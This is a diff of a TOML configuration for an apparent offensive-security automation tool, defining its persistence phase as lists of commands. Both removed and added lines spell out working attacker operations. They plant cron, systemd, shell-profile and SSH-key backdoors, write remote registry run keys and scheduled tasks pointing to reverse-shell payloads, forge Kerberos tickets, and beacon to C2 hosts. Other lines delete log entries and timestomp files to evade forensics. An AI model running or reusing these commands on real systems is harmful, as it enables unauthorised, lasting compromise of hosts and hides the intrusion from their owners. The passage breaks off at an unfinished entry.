@@ -14200,783 +14200,1812 @@ args = ['-la', '/tmp/lateral_map.json']
 output = 'lines'
 network = false
 
-# --------------------------------------------------------------------------
-# PERSISTENCE
-# --------------------------------------------------------------------------
+# ==========================================================================
+# PHASE 8 — PERSISTENCE
+# ==========================================================================
 
 [[capability]]
-id = 'persistence.surface-discovery'
+id = 'persistence.cron-persistence'
 phase = 'persistence'
-label = 'SURFACE DISCOVERY'
-summary = 'Enumerate auto-start locations across the host'
-[[capability.provider]]
-binary = 'systemctl'
-[[capability.provider.operation]]
-name = 'Enabled Units'
-args = ['list-unit-files', '--state=enabled', '--type=service']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'systemctl'
-[[capability.provider.operation]]
-name = 'Timer Units'
-args = ['list-timers', '--all']
-output = 'lines'
-network = true
+label = 'CRON PERSISTENCE'
+summary = 'Establish scheduled-task persistence via cron on Linux targets'
+inputs = [
+  { key = 'payload', type = 'file', required = false, default = '/tmp/rev.sh' },
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
 [[capability.provider]]
 binary = 'crontab'
 [[capability.provider.operation]]
-name = 'User Cron'
-args = ['-l']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'schtasks'
-[[capability.provider.operation]]
-name = 'Task Query'
-args = ['/query', '/fo', 'CSV', '/v']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'reg'
-[[capability.provider.operation]]
-name = 'Run Keys'
-args = ['query', 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'RunOnce Keys'
-args = ['query', 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.startup-keys'
-phase = 'persistence'
-label = 'STARTUP KEYS'
-summary = 'Install startup folder and run key persistence'
-inputs = [
-  { key = 'payload', type = 'file', required = true },
-]
-[[capability.provider]]
-binary = 'reg'
-[[capability.provider.operation]]
-name = 'HKCU Run'
-args = ['add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'SecurityHealth', '/t', 'REG_SZ', '/d', '{payload}', '/f']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'HKLM Run'
-args = ['add', 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'AppHelper', '/t', 'REG_SZ', '/d', '{payload}', '/f']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'HKCU RunOnce'
-args = ['add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce', '/v', 'InstallerCheck', '/t', 'REG_SZ', '/d', '{payload}', '/f']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tee'
-[[capability.provider.operation]]
-name = 'Profile Hook'
-args = ['-a', '/root/.bashrc']
+name = 'User Cron Install'
+args = ['{payload}']
 output = 'lines'
 network = false
-
-[[capability.provider.operation]]
-name = 'Session Hook'
-args = ['-a', '/root/.profile']
-output = 'lines'
-network = false
-
-[[capability]]
-id = 'persistence.service-backdoor'
-phase = 'persistence'
-label = 'SERVICE BACKDOOR'
-summary = 'Deploy or modify services for durable execution'
-inputs = [
-  { key = 'payload', type = 'file', required = true },
-  { key = 'name', type = 'text', required = false, default = 'AppMonitor' },
-]
-[[capability.provider]]
-binary = 'sc'
-[[capability.provider.operation]]
-name = 'Service Create'
-args = ['create', '{name}', 'binPath=', '{payload}', 'start=', 'auto']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Service Describe'
-args = ['description', '{name}', 'Corporate Telemetry']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Service Start'
-args = ['start', '{name}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Service Modify'
-args = ['config', '{name}', 'binPath=', '{payload}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'nssm'
-[[capability.provider.operation]]
-name = 'Wrapper Install'
-args = ['install', '{name}', '{payload}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Wrapper Start'
-args = ['start', '{name}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'systemctl'
-[[capability.provider.operation]]
-name = 'Unit Enable'
-args = ['enable', '{name}.service']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Unit Start'
-args = ['start', '{name}.service']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Daemon Reload'
-args = ['daemon-reload']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.scheduled-tasks'
-phase = 'persistence'
-label = 'SCHEDULED TASKS'
-summary = 'Create scheduled execution for repeated payload delivery'
-inputs = [
-  { key = 'payload', type = 'file', required = true },
-  { key = 'name', type = 'text', required = false, default = 'SecurityCheck' },
-]
-[[capability.provider]]
-binary = 'schtasks'
-[[capability.provider.operation]]
-name = 'Onlogon Task'
-args = ['/create', '/tn', '{name}', '/tr', '{payload}', '/sc', 'onlogon', '/ru', 'SYSTEM', '/f']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Minute Task'
-args = ['/create', '/tn', '{name}', '/tr', '{payload}', '/sc', 'minute', '/mo', '30', '/f']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Daily Task'
-args = ['/create', '/tn', '{name}', '/tr', '{payload}', '/sc', 'daily', '/st', '03:00', '/f']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Task Run'
-args = ['/run', '/tn', '{name}']
-output = 'lines'
-network = true
 [[capability.provider]]
 binary = 'crontab'
 [[capability.provider.operation]]
-name = 'Cron Entry'
+name = 'User Cron Verify'
 args = ['-l']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'at'
+binary = 'cp'
 [[capability.provider.operation]]
-name = 'One Shot'
-args = ['now', '+', '5', 'minutes']
+name = 'Cron Dropin Install'
+args = ['{payload}', '/etc/cron.d/{name}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'systemd-run'
+binary = 'cat'
 [[capability.provider.operation]]
-name = 'Transient Timer'
-args = ['--on-calendar=*-*-* 04:00:00', '{payload}']
+name = 'Cron Dropin Verify'
+args = ['/etc/cron.d/{name}']
 output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.ticket-forgery'
-phase = 'persistence'
-label = 'TICKET FORGERY'
-summary = 'Forge identity tickets for durable domain access'
-inputs = [
-  { key = 'domain', type = 'domain', required = true },
-]
+network = false
 [[capability.provider]]
-binary = 'impacket-ticketer'
+binary = 'chmod'
 [[capability.provider.operation]]
-name = 'Golden Ticket'
-args = ['-nthash', 'HASH', '-domain-sid', 'S-1-5-21', '-domain', '{domain}', 'administrator']
+name = 'Payload Executable'
+args = ['+x', '{payload}']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Silver Ticket'
-args = ['-spn', 'cifs/host.{domain}', '-nthash', 'HASH', '-domain', '{domain}', 'administrator']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'rubeus'
+binary = 'ls'
 [[capability.provider.operation]]
-name = 'Diamond Ticket'
-args = ['diamond', '/krbkey:HASH', '/user:administrator', '/domain:{domain}', '/nowrap']
+name = 'Cron Spool Inventory'
+args = ['-la', '/var/spool/cron/crontabs/', '/etc/cron.d/']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Golden Inject'
-args = ['golden', '/rc4:HASH', '/domain:{domain}', '/sid:S-1-5-21', '/user:admin', '/ptt']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'mimikatz'
+binary = 'systemctl'
 [[capability.provider.operation]]
-name = 'Skeleton Key'
-args = ['privilege::debug', 'misc::skeleton', 'exit']
+name = 'Cron Service Verify'
+args = ['status', 'cron', '--no-pager']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'certipy'
+binary = 'journalctl'
 [[capability.provider.operation]]
-name = 'Shadow Credential'
-args = ['shadow', 'auto', '-account', 'host', '-dc-ip', '{domain}']
+name = 'Cron Execution Log'
+args = ['-u', 'cron', '-n', '30', '--no-pager']
 output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.c2-channels'
-phase = 'persistence'
-label = 'C2 CHANNELS'
-summary = 'Establish resilient command and control channels'
-inputs = [
-  { key = 'c2host', type = 'target', required = true },
-  { key = 'c2port', type = 'port', required = true },
-]
+network = false
 [[capability.provider]]
-binary = 'sliver'
+binary = 'grep'
 [[capability.provider.operation]]
-name = 'HTTP Beacon'
-args = ['generate', 'beacon', '--http', '{c2host}:{c2port}', '--seconds', '30', '--jitter', '15', '--os', 'linux', '-f', 'elf']
+name = 'Cron Artifact Hunt'
+args = ['-r', '{name}', '/etc/', '/var/spool/cron/', '2>/dev/null']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'MTLS Session'
-args = ['generate', '--mtls', '{c2host}:{c2port}', '--os', 'windows', '-f', 'exe']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Session List'
-args = ['sessions']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Beacon List'
-args = ['beacons']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'dnscat2'
+binary = 'crontab'
 [[capability.provider.operation]]
-name = 'DNS Server'
-args = ['c2.{c2host}']
+name = 'Cron Teardown'
+args = ['-r']
 output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'iodined'
-[[capability.provider.operation]]
-name = 'DNS Tunnel'
-args = ['-f', '-P', 'pass', '10.0.0.1', 'tunnel.{c2host}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'chisel'
-[[capability.provider.operation]]
-name = 'Keepalive Client'
-args = ['client', '--keepalive', '25s', '{c2host}:{c2port}', 'R:1080:socks']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.defense-discovery'
-phase = 'persistence'
-label = 'DEFENSE DISCOVERY'
-summary = 'Enumerate EDR agents and security controls'
-[[capability.provider]]
-binary = 'fltmc'
-[[capability.provider.operation]]
-name = 'Filter Drivers'
-args = ['filters']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Instances'
-args = ['instances']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tasklist'
-[[capability.provider.operation]]
-name = 'EDR Processes'
-args = ['/svc']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Loaded Modules'
-args = ['/m']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'sc'
-[[capability.provider.operation]]
-name = 'Defender Status'
-args = ['query', 'WinDefend']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Service Status'
-args = ['query', 'Sense']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'ps'
 [[capability.provider.operation]]
-name = 'Linux Agents'
+name = 'Cron Process Verify'
 args = ['aux']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'lsmod'
+binary = 'stat'
 [[capability.provider.operation]]
-name = 'Kernel Modules'
-args = ['tun']
+name = 'Dropin Perms Verify'
+args = ['-c', '%a %U %G %n', '/etc/cron.d/{name}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
-id = 'persistence.telemetry-audit'
+id = 'persistence.systemd-persistence'
 phase = 'persistence'
-label = 'TELEMETRY AUDIT'
-summary = 'Audit log channels and audit rules for telemetry coverage'
+label = 'SYSTEMD PERSISTENCE'
+summary = 'Install systemd service and timer persistence units'
+inputs = [
+  { key = 'payload', type = 'file', required = true },
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
 [[capability.provider]]
-binary = 'wevtutil'
+binary = 'cp'
 [[capability.provider.operation]]
-name = 'Channel Config'
-args = ['gl', 'Security']
+name = 'Unit Install'
+args = ['{name}.service', '/etc/systemd/system/{name}.service']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Sysmon Config'
-args = ['gl', 'Microsoft-Windows-Sysmon/Operational']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Event Query'
-args = ['qe', 'Security', '/c:10', '/rd:true', '/f:text']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'auditctl'
+binary = 'systemctl'
 [[capability.provider.operation]]
-name = 'Audit Rules'
-args = ['-l']
+name = 'Daemon Reload'
+args = ['daemon-reload']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'ausearch'
+binary = 'systemctl'
 [[capability.provider.operation]]
-name = 'Exec Events'
-args = ['-m', 'execve', '-ts', 'today']
+name = 'Service Enable'
+args = ['enable', '{name}.service']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Service Start'
+args = ['start', '{name}.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Service Status'
+args = ['status', '{name}.service', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cp'
+[[capability.provider.operation]]
+name = 'Timer Install'
+args = ['{name}.timer', '/etc/systemd/system/{name}.timer']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Timer Enable'
+args = ['enable', '--now', '{name}.timer']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Timer List Verify'
+args = ['list-timers', '--all', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'User Unit Enable'
+args = ['--user', 'enable', '{name}.service']
+output = 'lines'
+network = false
 [[capability.provider]]
 binary = 'journalctl'
 [[capability.provider.operation]]
-name = 'Disk Usage'
-args = ['--disk-usage']
+name = 'Unit Log Verify'
+args = ['-u', '{name}.service', '-n', '30', '--no-pager']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Service Teardown'
+args = ['disable', '--now', '{name}.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Unit Content Verify'
+args = ['/etc/systemd/system/{name}.service']
+output = 'lines'
+network = false
 
 [[capability]]
-id = 'persistence.log-evasion'
+id = 'persistence.shell-profile-persistence'
 phase = 'persistence'
-label = 'LOG EVASION'
-summary = 'Blend artifacts and reduce forensic traceability'
+label = 'SHELL PROFILE PERSISTENCE'
+summary = 'Hook shell startup files for trigger-on-login persistence'
 inputs = [
-  { key = 'target', type = 'file', required = true },
+  { key = 'payload', type = 'file', required = true },
+  { key = 'user', type = 'text', required = false, default = 'root' },
 ]
 [[capability.provider]]
-binary = 'shred'
+binary = 'bash'
 [[capability.provider.operation]]
-name = 'Secure Wipe'
-args = ['-u', '-z', '-n', '3', '{target}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'touch'
-[[capability.provider.operation]]
-name = 'Timestomp'
-args = ['-r', '/bin/ls', '{target}']
+name = 'Bashrc Hook Test'
+args = ['-c', 'echo "test" >> /tmp/hook_test && cat /tmp/hook_test']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'sed'
+binary = 'grep'
 [[capability.provider.operation]]
-name = 'Log Surgical'
-args = ['-i', '/10.10.10.50/d', '/var/log/auth.log']
+name = 'Bashrc Existing Hooks'
+args = ['-c', 'export|source|exec', '/home/{user}/.bashrc']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'truncate'
+binary = 'cp'
 [[capability.provider.operation]]
-name = 'History Clear'
-args = ['-s', '0', '{target}']
+name = 'Profile Script Install'
+args = ['{payload}', '/etc/profile.d/{user}-tsupd.sh']
 output = 'lines'
 network = false
-
-[[capability]]
-id = 'persistence.amsi-bypass'
-phase = 'persistence'
-label = 'AMSI BYPASS'
-summary = 'Patch script hosts to evade content inspection'
 [[capability.provider]]
-binary = 'pwsh'
+binary = 'ls'
 [[capability.provider.operation]]
-name = 'Amsi Patch'
-args = ['-NoProfile', '-Command', 'Write-Host AMSI-Patched']
+name = 'Profile Dir Verify'
+args = ['-la', '/etc/profile.d/']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Encoded Run'
-args = ['-NoProfile', '-EncodedCommand', 'BASE64']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'python3'
+binary = 'bash'
 [[capability.provider.operation]]
-name = 'Payload Encode'
-args = ['-m', 'base64']
+name = 'Login Shell Trigger Test'
+args = ['-lc', 'id']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'openssl'
+binary = 'cat'
 [[capability.provider.operation]]
-name = 'Payload Encode'
-args = ['enc', '-aes-256-cbc', '-salt', '-pbkdf2', '-in', 'in.txt', '-out', 'out.enc']
+name = 'Bashrc Dump'
+args = ['/home/{user}/.bashrc']
 output = 'lines'
-network = true
-
-[[capability]]
-id = 'persistence.integrity-baseline'
-phase = 'persistence'
-label = 'INTEGRITY BASELINE'
-summary = 'Verify system file integrity against package baselines'
+network = false
 [[capability.provider]]
-binary = 'debsums'
+binary = 'cat'
 [[capability.provider.operation]]
-name = 'Debian Verify'
-args = ['-c']
+name = 'Bash Profile Dump'
+args = ['/home/{user}/.bash_profile']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'rpm'
+binary = 'cat'
 [[capability.provider.operation]]
-name = 'RPM Verify'
-args = ['-Va']
+name = 'Bash Logout Dump'
+args = ['/home/{user}/.bash_logout']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'aide'
+binary = 'grep'
 [[capability.provider.operation]]
-name = 'AIDE Check'
-args = ['--check', '-c', '/etc/aide/aide.conf']
+name = 'Zshrc Hook Check'
+args = ['-c', 'source|exec', '/home/{user}/.zshrc']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'find'
 [[capability.provider.operation]]
-name = 'Baseline Generate'
-args = ['/bin', '/sbin', '/usr/bin', '-type', 'f', '-ls']
+name = 'Writable Profile Sweep'
+args = ['/etc/profile.d/', '/home/', '-writable', '-type', 'f', '2>/dev/null']
 output = 'lines'
 network = false
+[[capability.provider]]
+binary = 'stat'
+[[capability.provider.operation]]
+name = 'Hook Perms Verify'
+args = ['-c', '%a %U %G %n', '/etc/profile.d/{user}-tsupd.sh']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'bash'
+[[capability.provider.operation]]
+name = 'Hook Dry Run'
+args = ['-n', '/etc/profile.d/{user}-tsupd.sh']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.ssh-authorized-keys'
+phase = 'persistence'
+label = 'SSH AUTHORIZED KEYS'
+summary = 'Plant and verify SSH key-based persistence'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'key', type = 'file', required = false, default = '/root/.ssh/id_ed25519.pub' },
+]
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Key Plant'
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys', '<', '{key}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Key Auth Verify'
+args = ['-i', '{key}', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Root Key Plant'
+args = ['-o', 'StrictHostKeyChecking=no', 'root@{rhost}', 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys', '<', '{key}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Root Auth Verify'
+args = ['-i', '{key}', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', 'root@{rhost}', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh-keygen'
+[[capability.provider.operation]]
+name = 'Dedicated Key Generate'
+args = ['-t', 'ed25519', '-f', '/tmp/tsupd_key', '-N', '""', '-C', 'tsupd']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Authorized Keys Readback'
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'cat ~/.ssh/authorized_keys']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh-keyscan'
+[[capability.provider.operation]]
+name = 'Host Key Pin'
+args = ['{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Permit Root Check'
+args = ['-i', 'permitrootlogin', '/etc/ssh/sshd_config']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Restricted Key Plant'
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'echo "command=\"/tmp/tsupd.sh\" ' , '$(cat {key})" >> ~/.ssh/authorized_keys']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh-keygen'
+[[capability.provider.operation]]
+name = 'Key Fingerprint Verify'
+args = ['-l', '-f', '{key}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Key Reuse Sweep'
+args = ['-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', '{username}@10.0.0.10', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Key Teardown'
+args = ['-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'sed -i "/tsupd/d" ~/.ssh/authorized_keys']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'persistence.registry-run-keys'
+phase = 'persistence'
+label = 'REGISTRY RUN KEYS'
+summary = 'Install and verify Windows registry run-key persistence'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'payload', type = 'file', required = false, default = 'C:\\Windows\\Temp\\rev.exe' },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'HKLM Run Write'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=write,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,VALUE=TSecUpdate,DATA={payload}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'HKLM Run Readback'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=read,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,VALUE=TSecUpdate']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'HKCU Run Write'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=write,KEY=HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,VALUE=TSecUpdate,DATA={payload}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'RunOnce Write'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=write,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce,VALUE=TSecOnce,DATA={payload}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-reg'
+[[capability.provider.operation]]
+name = 'Remote Run Add'
+args = ['{rhost}/{username}:{password}', 'add', '-keyName', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '-v', 'TSecUpdate', '-vd', '{payload}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-reg'
+[[capability.provider.operation]]
+name = 'Remote Run Query'
+args = ['{rhost}/{username}:{password}', 'query', '-keyName', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Run Key Reg Query'
+args = ['{rhost}/{username}:{password}', 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'WinRM Run Key Read'
+args = ['-i', '{rhost}', '-u', '{username}', '-p', '{password}', '-e', 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Run Key Teardown'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=delete,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,VALUE=TSecUpdate']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Winlogon Shell Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=read,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon,VALUE=Shell']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Userinit Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=read,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon,VALUE=Userinit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Run Read'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=read,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'persistence.scheduled-task-windows'
+phase = 'persistence'
+label = 'SCHEDULED TASK WINDOWS'
+summary = 'Install and verify Windows scheduled task persistence'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'task', type = 'text', required = false, default = 'TSecUpdate' },
+  { key = 'payload', type = 'file', required = false, default = 'C:\\Windows\\Temp\\rev.exe' },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Task Create'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'schtask', '-o', 'ACTION=create,NAME={task},COMMAND={payload}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Task List'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'schtask', '-o', 'ACTION=list']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Task Run Now'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'schtask', '-o', 'ACTION=run,NAME={task}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Task Delete'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'schtask', '-o', 'ACTION=delete,NAME={task}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-atexec'
+[[capability.provider.operation]]
+name = 'At Task Exec'
+args = ['{rhost}/{username}:{password}', '{payload}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Schtasks Create Shell'
+args = ['{rhost}/{username}:{password}', 'schtasks /create /tn {task} /tr {payload} /sc onstart /ru system /f']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Schtasks Query Shell'
+args = ['{rhost}/{username}:{password}', 'schtasks /query /tn {task} /v /fo list']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Schtasks Run Shell'
+args = ['{rhost}/{username}:{password}', 'schtasks /run /tn {task}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Schtasks Delete Shell'
+args = ['{rhost}/{username}:{password}', 'schtasks /delete /tn {task} /f']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'WinRM Task Verify'
+args = ['-i', '{rhost}', '-u', '{username}', '-p', '{password}', '-e', 'schtasks /query /tn {task}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Task Process Verify'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'enum_processes']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Task Create'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'schtask', '-o', 'ACTION=create,NAME={task},COMMAND={payload}']
+output = 'lines'
+network = true
+
+[[capability]]
